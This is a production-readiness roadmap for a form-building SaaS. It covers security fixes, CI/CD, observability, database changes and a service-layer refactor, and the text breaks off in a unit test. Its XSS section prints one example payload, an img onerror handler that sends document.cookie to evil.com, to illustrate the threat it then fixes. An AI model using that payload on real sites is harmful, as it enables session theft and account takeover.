# ChaiForms Production Readiness Roadmap

**Current Score: 72/100 — Senior Mid-Level Quality**  
**Target Score: 90+/100 — Staff+ Production-Grade Quality**

This document outlines all critical improvements needed to transform ChaiForms from a well-executed MVP into a production-ready, enterprise-grade SaaS platform. Each section includes detailed context, implementation steps, and acceptance criteria.

---

## Table of Contents

1. [Critical Security Fixes (P0)](#1-critical-security-fixes-p0)
2. [Infrastructure & DevOps (P0)](#2-infrastructure--devops-p0)
3. [Database Optimization (P1)](#3-database-optimization-p1)
4. [Backend Architecture Improvements (P1)](#4-backend-architecture-improvements-p1)
5. [Frontend Performance & UX (P1)](#5-frontend-performance--ux-p1)
6. [Monorepo & Build Optimization (P2)](#6-monorepo--build-optimization-p2)
7. [API & Integration Improvements (P2)](#7-api--integration-improvements-p2)
8. [Testing & Quality Assurance (P2)](#8-testing--quality-assurance-p2)
9. [Observability & Monitoring (P1)](#9-observability--monitoring-p1)
10. [Product & UX Polish (P2)](#10-product--ux-polish-p2)

---

## 1. Critical Security Fixes (P0)

### 🚨 SEVERITY: HIGH — Form Password Brute Force Vulnerability

**Current State:**

- `/forms/slug/{slug}/unlock` endpoint has NO rate limiting
- Attackers can brute force 4-character passwords in minutes
- Demo password "demo1234" is weak and documented publicly

**Why This Matters:**

- Password-protected forms are a core feature for sensitive data collection
- Breach could expose confidential survey responses, HR data, medical forms
- Legal liability if customer data is compromised

**Implementation Steps:**

1. **Add rate limiting to unlock endpoint**

   ```typescript
   // packages/trpc/server/utils/unlock-rate-limiter.ts
   import { Ratelimit } from "@upstash/ratelimit";
   import { Redis } from "@upstash/redis";

   export const unlockRatelimit = new Ratelimit({
     redis: getRedis(),
     limiter: Ratelimit.slidingWindow(5, "60 m"), // 5 attempts per hour
     prefix: "chaiforms:unlock",
   });

   export async function assertUnlockRateLimit(
     identifier: string, // IP + slug combination
   ): Promise<void> {
     const { success, reset } = await unlockRatelimit.limit(identifier);
     if (!success) {
       const retryAfterMinutes = Math.ceil((reset - Date.now()) / 60000);
       throw new TRPCError({
         code: "TOO_MANY_REQUESTS",
         message: `Too many unlock attempts. Try again in ${retryAfterMinutes} minutes.`,
       });
     }
   }
   ```

2. **Update unlock procedure**

   ```typescript
   // packages/trpc/server/routes/forms/route.ts
   unlock: publicProcedure
     .input(z.object({ slug: z.string(), password: z.string() }))
     .mutation(async ({ input, ctx }) => {
       const ip = getClientIp(ctx.req) ?? "unknown";
       const rateLimitKey = `${ip}:${input.slug}`;

       // Rate limit BEFORE checking password
       await assertUnlockRateLimit(rateLimitKey);

       // ... rest of unlock logic
     }),
   ```

3. **Increase minimum password length**

   ```typescript
   // packages/schemas/src/form-settings.ts
   accessPassword: z.string().min(8).nullable().optional(), // was min(4)
   ```

4. **Add password strength validation**
   ```typescript
   // packages/schemas/src/form-settings.ts
   accessPassword: z
     .string()
     .min(8)
     .regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/,
       "Password must contain uppercase, lowercase, and number")
     .nullable()
     .optional(),
   ```

**Acceptance Criteria:**

- [ ] Unlock endpoint limited to 5 attempts per hour per IP+slug
- [ ] Minimum password length increased to 8 characters
- [ ] Password strength requirements enforced
- [ ] Rate limit errors return clear retry-after time
- [ ] Update seed script to use stronger demo password

**Estimated Effort:** 4 hours  
**Risk if Not Fixed:** HIGH — Data breach, legal liability

---

### 🚨 SEVERITY: MEDIUM — XSS in Form Titles and Descriptions

**Current State:**

- Form titles and descriptions are not sanitized
- Rendered directly in React components without escaping
- Stored XSS vulnerability allows attackers to inject malicious scripts

**Why This Matters:**

- Attacker creates form with title: `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">`
- When creator views dashboard, session cookie is stolen
- Attacker gains full account access

**Implementation Steps:**

1. **Install DOMPurify**

   ```bash
   cd apps/web
   pnpm add dompurify
   pnpm add -D @types/dompurify
   ```

2. **Create sanitization utility**

   ```typescript
   // apps/web/lib/sanitize.ts
   import DOMPurify from "dompurify";

   export function sanitizeHtml(dirty: string): string {
     return DOMPurify.sanitize(dirty, {
       ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "br"],
       ALLOWED_ATTR: ["href", "target", "rel"],
     });
   }

   export function sanitizeText(dirty: string): string {
     // Strip all HTML tags
     return DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [] });
   }
   ```

3. **Sanitize on display**

   ```typescript
   // apps/web/app/dashboard/forms/[id]/page.tsx
   import { sanitizeText } from "~/lib/sanitize";

   <h1>{sanitizeText(form.title)}</h1>
   <p>{sanitizeText(form.description)}</p>
   ```

4. **Add server-side validation**

   ```typescript
   // packages/trpc/server/routes/forms/route.ts
   import { sanitizeText } from "./utils/sanitize";

   create: protectedProcedure
     .input(z.object({
       title: z.string().min(1).max(255).transform(sanitizeText)
     }))
     .mutation(async ({ input, ctx }) => {
       // title is now sanitized
     }),
   ```

**Acceptance Criteria:**

- [ ] All user-generated content sanitized before display
- [ ] Server-side validation strips dangerous HTML
- [ ] XSS test suite passes (OWASP ZAP scan)
- [ ] CSP headers block inline scripts

**Estimated Effort:** 6 hours  
**Risk if Not Fixed:** MEDIUM — Account takeover, data theft

---

### 🚨 SEVERITY: MEDIUM — CSRF Token Reuse

**Current State:**

- CSRF tokens don't expire
- Same token can be reused indefinitely
- Weakens CSRF protection

**Implementation Steps:**

1. **Add expiry to CSRF tokens**

   ```typescript
   // packages/trpc/server/utils/csrf.ts
   import jwt from "jsonwebtoken";

   export function createCsrfToken(): string {
     return jwt.sign(
       { purpose: "csrf", nonce: randomUUID() },
       getCsrfSecret(),
       { expiresIn: "1h" }, // Add expiry
     );
   }

   export function verifyCsrfToken(token: string): boolean {
     try {
       const payload = jwt.verify(token, getCsrfSecret()) as {
         purpose?: string;
       };
       return payload.purpose === "csrf";
     } catch {
       return false; // Expired or invalid
     }
   }
   ```

2. **Rotate tokens on each request**
   ```typescript
   // apps/api/src/server.ts
   app.use((req, res, next) => {
     // Issue new token on every response
     const token = createCsrfToken();
     res.cookie(CSRF_COOKIE_NAME, token, csrfCookieOptions(isProd));
     next();
   });
   ```

**Acceptance Criteria:**

- [ ] CSRF tokens expire after 1 hour
- [ ] Expired tokens rejected with clear error
- [ ] New token issued on each response

**Estimated Effort:** 2 hours  
**Risk if Not Fixed:** MEDIUM — CSRF attacks possible

---

### 🔒 Additional Security Improvements

#### Add Content Security Policy (CSP)

**Current State:** No CSP headers, allowing inline scripts and external resources

**Implementation:**

```typescript
// apps/api/src/server.ts
import helmet from "helmet";

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'"], // Remove unsafe-inline gradually
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", process.env.NEXT_PUBLIC_API_URL],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
      },
    },
    hsts: {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    },
  }),
);
```

**Acceptance Criteria:**

- [ ] CSP headers present on all responses
- [ ] No CSP violations in browser console
- [ ] HSTS enabled for HTTPS enforcement

**Estimated Effort:** 3 hours

---

#### Implement Refresh Token Rotation

**Current State:** Refresh tokens are long-lived (30 days) without rotation

**Implementation:**

```typescript
// packages/trpc/server/routes/auth/route.ts
refresh: publicProcedure
  .mutation(async ({ ctx }) => {
    const oldRefreshToken = ctx.req.cookies["chaiforms-refresh"];
    const { sub, family } = verifyRefreshJwt(oldRefreshToken);

    // Check if token family is valid (not revoked)
    const [tokenRecord] = await db
      .select()
      .from(refreshTokensTable)
      .where(
        and(
          eq(refreshTokensTable.userId, sub),
          eq(refreshTokensTable.family, family),
          eq(refreshTokensTable.revoked, false)
        )
      )
      .limit(1);

    if (!tokenRecord) {
      // Token reuse detected — revoke entire family
      await db
        .update(refreshTokensTable)
        .set({ revoked: true })
        .where(eq(refreshTokensTable.family, family));

      throw new TRPCError({
        code: "UNAUTHORIZED",
        message: "Token reuse detected",
      });
    }

    // Revoke old token
    await db
      .update(refreshTokensTable)
      .set({ revoked: true })
      .where(eq(refreshTokensTable.id, tokenRecord.id));

    // Issue new token with same family
    const newRefreshToken = signRefreshJwt(sub, family);
    const newAccessToken = signAccessJwt(sub);

    // Store new refresh token
    await db.insert(refreshTokensTable).values({
      userId: sub,
      family,
      tokenHash: hashToken(newRefreshToken),
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    });

    return { accessToken: newAccessToken, refreshToken: newRefreshToken };
  }),
```

**Acceptance Criteria:**

- [ ] Refresh tokens rotated on each use
- [ ] Token reuse detected and entire family revoked
- [ ] Old tokens invalidated immediately

**Estimated Effort:** 6 hours

---

## 2. Infrastructure & DevOps (P0)

### 🚨 CRITICAL: No CI/CD Pipeline

**Current State:**

- Manual deployments
- No automated testing before deploy
- No build verification
- High risk of breaking production

**Why This Matters:**

- Manual deployments are error-prone
- Can't scale team without automation
- No rollback strategy
- Downtime on failed deploys

**Implementation Steps:**

1. **Create GitHub Actions workflow**

   ```yaml
   # .github/workflows/ci.yml
   name: CI/CD Pipeline

   on:
     push:
       branches: [main, develop]
     pull_request:
       branches: [main]

   jobs:
     test:
       runs-on: ubuntu-latest

       services:
         postgres:
           image: postgres:15
           env:
             POSTGRES_PASSWORD: postgres
             POSTGRES_DB: chaiforms_test
           options: >-
             --health-cmd pg_isready
             --health-interval 10s
             --health-timeout 5s
             --health-retries 5
           ports:
             - 5432:5432

       steps:
         - uses: actions/checkout@v4

         - uses: pnpm/action-setup@v2
           with:
             version: 9.0.0

         - uses: actions/setup-node@v4
           with:
             node-version: 18
             cache: "pnpm"

         - name: Install dependencies
           run: pnpm install --frozen-lockfile

         - name: Run linter
           run: pnpm lint

         - name: Type check
           run: pnpm check-types

         - name: Run tests
           run: pnpm test
           env:
             DATABASE_URL: postgresql://postgres:postgres@localhost:5432/chaiforms_test
             JWT_SECRET: test-secret-min-32-characters-long

         - name: Build all packages
           run: pnpm build

     deploy-api:
       needs: test
       if: github.ref == 'refs/heads/main'
       runs-on: ubuntu-latest
       steps:
         - uses: actions/checkout@v4
         - name: Deploy to Railway
           run: |
             # Add Railway deployment script
             echo "Deploy API to Railway"

     deploy-web:
       needs: test
       if: github.ref == 'refs/heads/main'
       runs-on: ubuntu-latest
       steps:
         - uses: actions/checkout@v4
         - name: Deploy to Vercel
           run: |
             # Add Vercel deployment script
             echo "Deploy web to Vercel"
   ```

2. **Add pre-commit hooks**

   ```bash
   pnpm add -D husky lint-staged
   npx husky init
   ```

   ```json
   // package.json
   {
     "lint-staged": {
       "*.{ts,tsx}": ["eslint --fix", "prettier --write"],
       "*.{json,md}": ["prettier --write"]
     }
   }
   ```

   ```bash
   # .husky/pre-commit
   pnpm lint-staged
   pnpm check-types
   ```

3. **Add deployment configuration**

   ```dockerfile
   # apps/api/Dockerfile
   FROM node:18-alpine AS base
   RUN corepack enable && corepack prepare pnpm@9.0.0 --activate

   FROM base AS deps
   WORKDIR /app
   COPY package.json pnpm-lock.yaml pnpm-workspace.yaml ./
   COPY packages/database/package.json ./packages/database/
   COPY packages/trpc/package.json ./packages/trpc/
   COPY packages/schemas/package.json ./packages/schemas/
   COPY packages/logger/package.json ./packages/logger/
   COPY packages/services/package.json ./packages/services/
   COPY apps/api/package.json ./apps/api/
   RUN pnpm install --frozen-lockfile --filter @repo/api...

   FROM base AS builder
   WORKDIR /app
   COPY --from=deps /app/node_modules ./node_modules
   COPY . .
   RUN pnpm turbo build --filter @repo/api

   FROM base AS runner
   WORKDIR /app
   ENV NODE_ENV=production

   COPY --from=builder /app/apps/api/dist ./dist
   COPY --from=builder /app/node_modules ./node_modules
   COPY --from=builder /app/packages ./packages

   EXPOSE 8000
   CMD ["node", "dist/index.js"]
   ```

   ```yaml
   # docker-compose.yml
   version: "3.8"

   services:
     postgres:
       image: postgres:15-alpine
       environment:
         POSTGRES_DB: chaiforms
         POSTGRES_USER: postgres
         POSTGRES_PASSWORD: postgres
       ports:
         - "5432:5432"
       volumes:
         - postgres_data:/var/lib/postgresql/data

     redis:
       image: redis:7-alpine
       ports:
         - "6379:6379"

     api:
       build:
         context: .
         dockerfile: apps/api/Dockerfile
       ports:
         - "8000:8000"
       environment:
         DATABASE_URL: postgresql://postgres:postgres@postgres:5432/chaiforms
         REDIS_URL: redis://redis:6379
       depends_on:
         - postgres
         - redis

   volumes:
     postgres_data:
   ```

**Acceptance Criteria:**

- [ ] CI runs on every PR and push to main
- [ ] All tests must pass before merge
- [ ] Automated deployment to staging on merge to develop
- [ ] Automated deployment to production on merge to main
- [ ] Pre-commit hooks prevent bad commits
- [ ] Docker builds succeed locally and in CI

**Estimated Effort:** 16 hours  
**Risk if Not Fixed:** CRITICAL — Can't scale team, high deployment risk

---

### 🚨 CRITICAL: No Observability

**Current State:**

- No structured logging
- No error tracking
- No performance monitoring
- Can't debug production issues

**Implementation Steps:**

1. **Add Sentry for error tracking**

   ```bash
   pnpm add @sentry/node @sentry/nextjs
   ```

   ```typescript
   // apps/api/src/sentry.ts
   import * as Sentry from "@sentry/node";

   Sentry.init({
     dsn: process.env.SENTRY_DSN,
     environment: process.env.NODE_ENV,
     tracesSampleRate: 0.1,
     integrations: [
       new Sentry.Integrations.Http({ tracing: true }),
       new Sentry.Integrations.Express({ app }),
     ],
   });

   export { Sentry };
   ```

   ```typescript
   // apps/api/src/server.ts
   import { Sentry } from "./sentry";

   app.use(Sentry.Handlers.requestHandler());
   app.use(Sentry.Handlers.tracingHandler());

   // ... routes ...

   app.use(Sentry.Handlers.errorHandler());
   ```

2. **Implement structured logging**

   ```typescript
   // packages/logger/index.ts
   import pino from "pino";

   export const logger = pino({
     level: process.env.LOG_LEVEL || "info",
     formatters: {
       level: (label) => ({ level: label }),
     },
     timestamp: pino.stdTimeFunctions.isoTime,
     ...(process.env.NODE_ENV === "production"
       ? {}
       : {
           transport: {
             target: "pino-pretty",
             options: {
               colorize: true,
               translateTime: "SYS:standard",
               ignore: "pid,hostname",
             },
           },
         }),
   });

   export function createLogger(context: string) {
     return logger.child({ context });
   }
   ```

3. **Add request correlation IDs**

   ```typescript
   // apps/api/src/middleware/correlation-id.ts
   import { randomUUID } from "crypto";

   export function correlationIdMiddleware(req, res, next) {
     const correlationId = req.headers["x-correlation-id"] || randomUUID();
     req.correlationId = correlationId;
     res.setHeader("x-correlation-id", correlationId);

     // Add to logger context
     req.log = logger.child({ correlationId });

     next();
   }
   ```

4. **Add Prometheus metrics**

   ```typescript
   // apps/api/src/metrics.ts
   import promClient from "prom-client";

   const register = new promClient.Registry();

   promClient.collectDefaultMetrics({ register });

   export const httpRequestDuration = new promClient.Histogram({
     name: "http_request_duration_seconds",
     help: "Duration of HTTP requests in seconds",
     labelNames: ["method", "route", "status_code"],
     registers: [register],
   });

   export const formSubmissions = new promClient.Counter({
     name: "form_submissions_total",
     help: "Total number of form submissions",
     labelNames: ["form_id", "status"],
     registers: [register],
   });

   export { register };
   ```

   ```typescript
   // apps/api/src/server.ts
   import { register, httpRequestDuration } from "./metrics";

   app.get("/metrics", async (req, res) => {
     res.set("Content-Type", register.contentType);
     res.end(await register.metrics());
   });

   app.use((req, res, next) => {
     const start = Date.now();
     res.on("finish", () => {
       const duration = (Date.now() - start) / 1000;
       httpRequestDuration
         .labels(req.method, req.route?.path || req.path, res.statusCode)
         .observe(duration);
     });
     next();
   });
   ```

**Acceptance Criteria:**

- [ ] All errors sent to Sentry with context
- [ ] Structured logs with correlation IDs
- [ ] Prometheus metrics exposed at `/metrics`
- [ ] Grafana dashboard for key metrics
- [ ] Alerts configured for error rate spikes

**Estimated Effort:** 12 hours  
**Risk if Not Fixed:** CRITICAL — Can't debug production issues

---

### 🔧 Add Health Checks with Database Connectivity

**Current State:** `/health` endpoint returns static JSON

**Implementation:**

```typescript
// apps/api/src/server.ts
app.get("/health", async (req, res) => {
  const checks = {
    uptime: process.uptime(),
    timestamp: Date.now(),
    database: "unknown",
    redis: "unknown",
  };

  try {
    // Check database
    await db.execute(sql`SELECT 1`);
    checks.database = "healthy";
  } catch (err) {
    checks.database = "unhealthy";
    logger.error("Database health check failed", { err });
  }

  try {
    // Check Redis (if configured)
    if (hasUpstashConfig()) {
      const redis = getRedis();
      await redis.ping();
      checks.redis = "healthy";
    } else {
      checks.redis = "not_configured";
    }
  } catch (err) {
    checks.redis = "unhealthy";
    logger.error("Redis health check failed", { err });
  }

  const isHealthy = checks.database === "healthy";
  res.status(isHealthy ? 200 : 503).json({
    status: isHealthy ? "healthy" : "unhealthy",
    checks,
  });
});
```

**Acceptance Criteria:**

- [ ] Health check verifies database connectivity
- [ ] Health check verifies Redis connectivity (if configured)
- [ ] Returns 503 if any critical service is down
- [ ] Kubernetes/Railway can use for liveness/readiness probes

**Estimated Effort:** 2 hours

---

## 3. Database Optimization (P1)

### 🐌 PERFORMANCE: Answers Table is EAV Anti-Pattern

**Current State:**

- Answers stored as `(responseId, fieldId, value TEXT)`
- All data types (numbers, dates, arrays) stringified
- Analytics queries require full table scans
- No type safety at database level

**Why This Matters:**

- At 1M responses with 10 fields each = 10M rows in answers table
- Query: "Get average rating for field X" requires parsing TEXT to numbers
- No indexes on values (can't index TEXT efficiently)
- JSON parsing overhead on every query

**Implementation Steps:**

1. **Create new answers table schema**

   ```typescript
   // packages/database/models/answer-v2.ts
   export const answersV2Table = pgTable(
     "answers_v2",
     {
       id: uuid("id").primaryKey().defaultRandom(),
       responseId: uuid("response_id")
         .notNull()
         .references(() => responsesTable.id, { onDelete: "cascade" }),
       fieldId: uuid("field_id").notNull(),

       // Type-specific columns
       valueText: text("value_text"),
       valueNumber: doublePrecision("value_number"),
       valueDate: timestamp("value_date"),
       valueBoolean: boolean("value_boolean"),
       valueJson: jsonb("value_json"), // For arrays, objects

       createdAt: timestamp("created_at").defaultNow(),
     },
     (t) => [
       index("answers_v2_response_id_idx").on(t.responseId),
       index("answers_v2_field_id_idx").on(t.fieldId),

       // Partial indexes for efficient filtering
       index("answers_v2_text_idx")
         .on(t.fieldId, t.valueText)
         .where(sql`value_text IS NOT NULL`),
       index("answers_v2_number_idx")
         .on(t.fieldId, t.valueNumber)
         .where(sql`value_number IS NOT NULL`),
       index("answers_v2_date_idx")
         .on(t.fieldId, t.valueDate)
         .where(sql`value_date IS NOT NULL`),
     ],
   );
   ```

2. **Create migration script**

   ```typescript
   // packages/database/migrations/migrate-answers-to-v2.ts
   import { db } from "../index";
   import { answersTable, answersV2Table } from "../schema";

   async function migrateAnswers() {
     const batchSize = 1000;
     let offset = 0;

     while (true) {
       const answers = await db.select().from(answersTable).limit(batchSize).offset(offset);

       if (answers.length === 0) break;

       const v2Answers = answers.map((answer) => {
         // Determine type and parse value
         const value = answer.value;
         let valueText = null;
         let valueNumber = null;
         let valueDate = null;
         let valueBoolean = null;
         let valueJson = null;

         // Try parsing as number
         const num = Number(value);
         if (!isNaN(num) && value.trim() !== "") {
           valueNumber = num;
         }
         // Try parsing as date
         else if (Date.parse(value)) {
           valueDate = new Date(value);
         }
         // Try parsing as boolean
         else if (value === "true" || value === "false") {
           valueBoolean = value === "true";
         }
         // Try parsing as JSON
         else if (value.startsWith("[") || value.startsWith("{")) {
           try {
             valueJson = JSON.parse(value);
           } catch {
             valueText = value;
           }
         }
         // Default to text
         else {
           valueText = value;
         }

         return {
           id: answer.id,
           responseId: answer.responseId,
           fieldId: answer.fieldId,
           valueText,
           valueNumber,
           valueDate,
           valueBoolean,
           valueJson,
         };
       });

       await db.insert(answersV2Table).values(v2Answers);
       offset += batchSize;
       console.log(`Migrated ${offset} answers`);
     }
   }
   ```

3. **Update response submission to use v2**

   ```typescript
   // packages/trpc/server/routes/responses/route.ts
   submit: publicProcedure
     .mutation(async ({ input, ctx }) => {
       // ... validation ...

       // Insert answers with proper types
       const typedAnswers = input.answers.map((a) => {
         const field = fields.find((f) => f.id === a.fieldId);

         switch (field?.type) {
           case "number":
           case "rating":
             return {
               responseId: response.id,
               fieldId: a.fieldId,
               valueNumber: Number(a.value),
             };
           case "date":
             return {
               responseId: response.id,
               fieldId: a.fieldId,
               valueDate: new Date(a.value),
             };
           case "checkbox":
             return {
               responseId: response.id,
               fieldId: a.fieldId,
               valueBoolean: a.value === "true",
             };
           case "multi_select":
             return {
               responseId: response.id,
               fieldId: a.fieldId,
               valueJson: JSON.parse(a.value),
             };
           default:
             return {
               responseId: response.id,
               fieldId: a.fieldId,
               valueText: a.value,
             };
         }
       });

       await db.insert(answersV2Table).values(typedAnswers);
     }),
   ```

**Acceptance Criteria:**

- [ ] New answers_v2 table created with typed columns
- [ ] Migration script successfully migrates existing data
- [ ] All new submissions use answers_v2
- [ ] Analytics queries 10x faster
- [ ] Can query "average rating" without parsing strings

**Estimated Effort:** 16 hours  
**Impact:** 10x faster analytics queries

---

### 🚀 Add Composite Indexes for Common Queries

**Current State:** Only single-column indexes exist

**Implementation:**

```sql
-- packages/database/drizzle/0005_add_composite_indexes.sql

-- Forms: Speed up dashboard queries
CREATE INDEX forms_creator_status_visibility_idx
  ON forms(creator_id, status, visibility)
  WHERE deleted_at IS NULL;

-- Responses: Speed up analytics queries
CREATE INDEX responses_form_submitted_idx
  ON responses(form_id, submitted_at DESC);

-- Responses: Speed up time-range queries
CREATE INDEX responses_submitted_at_idx
  ON responses(submitted_at DESC);

-- Workspace members: Speed up permission checks
CREATE INDEX workspace_members_workspace_user_idx
  ON workspace_members(workspace_id, user_id);

-- Forms: Speed up public explore queries
CREATE INDEX forms_public_explore_idx
  ON forms(status, visibility, created_at DESC)
  WHERE deleted_at IS NULL AND status = 'published' AND visibility = 'public';
```

**Acceptance Criteria:**

- [ ] Dashboard loads 5x faster
- [ ] Analytics queries use composite indexes (verify with EXPLAIN)
- [ ] Public explore page loads instantly

**Estimated Effort:** 4 hours

---

### 📊 Create Materialized Views for Analytics

**Current State:** Analytics queries join 3 tables on every request

**Implementation:**

```sql
-- packages/database/drizzle/0006_analytics_materialized_views.sql

-- Materialized view for form summary stats
CREATE MATERIALIZED VIEW form_summary_stats AS
SELECT
  f.id AS form_id,
  f.creator_id,
  COUNT(DISTINCT r.id) AS total_responses,
  COUNT(DISTINCT r.id) FILTER (
    WHERE r.submitted_at >= NOW() - INTERVAL '7 days'
  ) AS responses_last_7_days,
  COUNT(DISTINCT r.id) FILTER (
    WHERE r.submitted_at >= NOW() - INTERVAL '30 days'
  ) AS responses_last_30_days,
  AVG(EXTRACT(EPOCH FROM (r.submitted_at - r.started_at))) AS avg_duration_seconds,
  MAX(r.submitted_at) AS last_response_at
FROM forms f
LEFT JOIN responses r ON r.form_id = f.id
WHERE f.deleted_at IS NULL
GROUP BY f.id, f.creator_id;

CREATE UNIQUE INDEX form_summary_stats_form_id_idx
  ON form_summary_stats(form_id);

-- Refresh strategy: every 5 minutes via cron
CREATE OR REPLACE FUNCTION refresh_form_summary_stats()
RETURNS void AS $$
BEGIN
  REFRESH MATERIALIZED VIEW CONCURRENTLY form_summary_stats;
END;
$$ LANGUAGE plpgsql;
```

```typescript
// apps/api/src/cron/refresh-analytics.ts
import { db } from "@repo/database";
import { sql } from "drizzle-orm";

export async function refreshAnalyticsMaterializedViews() {
  await db.execute(sql`REFRESH MATERIALIZED VIEW CONCURRENTLY form_summary_stats`);
  logger.info("Refreshed analytics materialized views");
}

// In index.ts
setInterval(
  () => {
    void refreshAnalyticsMaterializedViews().catch((err) => {
      logger.error("Failed to refresh analytics views", { err });
    });
  },
  5 * 60 * 1000,
); // Every 5 minutes
```

**Acceptance Criteria:**

- [ ] Dashboard loads from materialized view (instant)
- [ ] View refreshes every 5 minutes
- [ ] Analytics are eventually consistent (acceptable tradeoff)

**Estimated Effort:** 8 hours

---

### 🗂️ Implement Table Partitioning for Responses

**Current State:** Single responses table will grow unbounded

**Implementation:**

```sql
-- packages/database/drizzle/0007_partition_responses.sql

-- Convert responses to partitioned table
ALTER TABLE responses RENAME TO responses_old;

CREATE TABLE responses (
  id UUID NOT NULL,
  form_id UUID NOT NULL,
  started_at TIMESTAMPTZ NOT NULL,
  submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  -- ... other columns ...
  PRIMARY KEY (id, submitted_at)
) PARTITION BY RANGE (submitted_at);

-- Create partitions for past and future months
CREATE TABLE responses_2024_01 PARTITION OF responses
  FOR VALUES FROM ('2024-01-01') TO ('2024-02-01');

CREATE TABLE responses_2024_02 PARTITION OF responses
  FOR VALUES FROM ('2024-02-01') TO ('2024-03-01');

-- ... create partitions for current year ...

-- Create default partition for future data
CREATE TABLE responses_default PARTITION OF responses DEFAULT;

-- Migrate data
INSERT INTO responses SELECT * FROM responses_old;

-- Drop old table
DROP TABLE responses_old;
```

```typescript
// apps/api/src/cron/create-response-partitions.ts
export async function createNextMonthPartition() {
  const nextMonth = new Date();
  nextMonth.setMonth(nextMonth.getMonth() + 1);
  const monthAfter = new Date(nextMonth);
  monthAfter.setMonth(monthAfter.getMonth() + 1);

  const partitionName = `responses_${nextMonth.getFullYear()}_${String(nextMonth.getMonth() + 1).padStart(2, "0")}`;

  await db.execute(sql`
    CREATE TABLE IF NOT EXISTS ${sql.identifier(partitionName)} 
    PARTITION OF responses
    FOR VALUES FROM (${nextMonth.toISOString()}) TO (${monthAfter.toISOString()})
  `);

  logger.info(`Created partition ${partitionName}`);
}

// Run monthly
setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
```

**Acceptance Criteria:**

- [ ] Responses table partitioned by month
- [ ] Old partitions can be archived/dropped
- [ ] Query performance maintained as data grows
- [ ] Automatic partition creation for future months

**Estimated Effort:** 12 hours  
**Impact:** Scales to billions of responses

---

## 4. Backend Architecture Improvements (P1)

### 🏗️ Extract Service Layer

**Current State:** Business logic lives in tRPC procedures

**Why This Matters:**

- Can't reuse logic outside tRPC (e.g., background jobs, CLI tools)
- Hard to test business logic in isolation
- Violates single responsibility principle

**Implementation Steps:**

1. **Create service layer structure**

   ```
   packages/services/
   ├── forms/
   │   ├── forms.service.ts
   │   ├── forms.service.test.ts
   │   └── types.ts
   ├── responses/
   │   ├── responses.service.ts
   │   ├── responses.service.test.ts
   │   └── types.ts
   ├── analytics/
   │   ├── analytics.service.ts
   │   └── types.ts
   └── index.ts
   ```

2. **Implement FormsService**

   ```typescript
   // packages/services/forms/forms.service.ts
   import { db, eq } from "@repo/database";
   import { formsTable } from "@repo/database/schema";
   import type { CreateFormInput, UpdateFormInput } from "./types";

   export class FormsService {
     async createForm(input: CreateFormInput) {
       const slug = await this.generateUniqueSlug();

       const [form] = await db
         .insert(formsTable)
         .values({
           ...input,
           slug,
           status: "draft",
           visibility: "unlisted",
           fields: [],
         })
         .returning();

       return form;
     }

     async updateForm(formId: string, input: UpdateFormInput) {
       // Validate slug uniqueness
       if (input.slug) {
         await this.assertSlugAvailable(input.slug, formId);
       }

       // Hash password if provided
       if (input.accessPassword) {
         input.accessPasswordHash = await this.hashPassword(input.accessPassword);
       }

       const [form] = await db
         .update(formsTable)
         .set(input)
         .where(eq(formsTable.id, formId))
         .returning();

       return form;
     }

     async deleteForm(formId: string) {
       await db.update(formsTable).set({ deletedAt: new Date() }).where(eq(formsTable.id, formId));
     }

     private async generateUniqueSlug(): Promise<string> {
       for (let i = 0; i < 10; i++) {
         const slug = nanoid(12)
           .toLowerCase()
           .replace(/[^a-z0-9-]/g, "-");
         const exists = await this.slugExists(slug);
         if (!exists) return slug;
       }
       throw new Error("Failed to generate unique slug");
     }

     private async slugExists(slug: string): Promise<boolean> {
       const [form] = await db
         .select({ id: formsTable.id })
         .from(formsTable)
         .where(eq(formsTable.slug, slug))
         .limit(1);
       return !!form;
     }

     private async assertSlugAvailable(slug: string, excludeFormId?: string) {
       const [form] = await db
         .select({ id: formsTable.id })
         .from(formsTable)
         .where(eq(formsTable.slug, slug))
         .limit(1);

       if (form && form.id !== excludeFormId) {
         throw new Error("Slug already in use");
       }
     }

     private async hashPassword(password: string): Promise<string> {
       return bcrypt.hash(password, 10);
     }
   }

   export const formsService = new FormsService();
   ```

3. **Update tRPC procedures to use service**

   ```typescript
   // packages/trpc/server/routes/forms/route.ts
   import { formsService } from "@repo/services/forms";

   export const formsRouter = router({
     create: protectedProcedure
       .input(z.object({ title: z.string().min(1).max(255) }))
       .mutation(async ({ input, ctx }) => {
         const form = await formsService.createForm({
           title: input.title,
           creatorId: ctx.user.id,
         });
         return mapForm(form);
       }),

     update: protectedProcedure
       .input(z.object({ formId: z.string().uuid() }).merge(formSettingsSchema))
       .mutation(async ({ input, ctx }) => {
         // Authorization check
         await assertOwnership(input.formId, ctx.user.id);

         // Delegate to service
         const { formId, ...settings } = input;
         const form = await formsService.updateForm(formId, settings);

         return mapForm(form);
       }),
   });
   ```

4. **Add unit tests for service**

   ```typescript
   // packages/services/forms/forms.service.test.ts
   import { describe, it, expect, beforeEach } from "vitest";
   import { formsService } from "./forms.service";

   describe("FormsService", () => {
     describe("createForm", () => {
       it("should create form with unique slug", async () => {
         const form = await formsService.createForm({
           title: "Test Form",
           creatorId: "user-123",
         });

         expect(form.slug).toMatch(/^[a-z0-9-]{12}$/);
         expect(form.status).toBe("draft");
       });

       it("should retry slug generation on collision", async () => {
         // Mock slug collision
         const spy = vi.spyOn(formsService as any, "slugExists");
         spy.mockResolvedValueOnce(true); // First attempt fails
         spy.mockResolvedValueOnce(false); // Second succeeds

         const form = await formsService.createForm({
           title: "Test Form",
           creatorId: "user-123",
         });

         expect(spy).toHaveBeenCalledTimes(2);
         expect(form).toBeDefined();
       });
     });

     describe("updateForm", () => {
       it("should hash password when provided", async () => {
         const form = await formsService.updateForm("form-123", {
           accessPassword: "newpassword123",
         });

